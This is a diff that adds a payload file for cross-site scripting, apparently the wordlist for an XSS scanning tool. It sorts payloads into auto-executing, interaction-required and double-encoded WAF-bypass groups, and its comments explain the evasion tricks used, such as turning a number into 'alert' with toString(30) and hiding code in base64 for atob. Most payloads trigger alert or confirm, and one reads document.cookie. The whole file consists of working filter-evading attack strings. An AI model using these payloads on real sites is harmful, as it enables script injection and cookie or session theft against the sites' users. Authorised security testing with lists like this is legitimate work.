@@ -1,0 +1,30 @@
+# Auto-executing — work without user interaction
+"><Body/OnPageShow=&#x00063;&#x0006F;&#x0006E;&#x00066;&#x00069;&#x00072;&#x0006D;(1)>
+<svg><a onbegin=alert&lpar;1&rpar; dur=1s><animate>
+<Img Src=OnXSS OnError=(alert)(1)>
+<details/ontoggle=pp=eval;Array.prototype&#x5B;Symbol.hastInstance&#x5D;=pp;y&quot;&bsol;x29&quot;;xquot;&bsol;x28&quot;;al=&quot;al&quot;;;al+&quot;ert&quot;+x+&quot;origin&quot;+y&#x20;instanceof&#x20;&#x5B;&#x5D;        open=1>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))
+<meta http-equiv=refresh content=0,#x id=x onbeforematch=alert() hidden=until-found>
+<svg onload=alert&#0000000040"1")><"">
+<svg xmlns="http://w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
+
+# Requires user interaction — useful for manual confirmation, not auto-detected by this tool
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+
+# Pre-encoded (double-encoded percent) — WAF bypass, injected raw without re-encoding
+"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+asd%27%22%3E%0A%0D%3Casd/onauxclick%3d[domain].some%26%2340%3bconfirm%2529%0A%26%23%22%3E
+<iframe src=java&Tab;script&colon;alert1>
+
+# Added — complementary bypasses, auto-executing
+# toString(30) trick: 8680439 in base 30 = "alert" — bypasses string-matching WAF rules
+<img src=x onerror=top[8680439..toString(30)](1)>
+# Unknown tag + autofocus: fires on page load, unknown tag bypasses tag-whitelist filters
+<xss id=x tabindex=1 onfocus=confirm(1) style=display:block autofocus>
+# setTimeout(string) as indirect eval + atob encoding — "alert(document.domain)"
+<svg onload=setTimeout(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
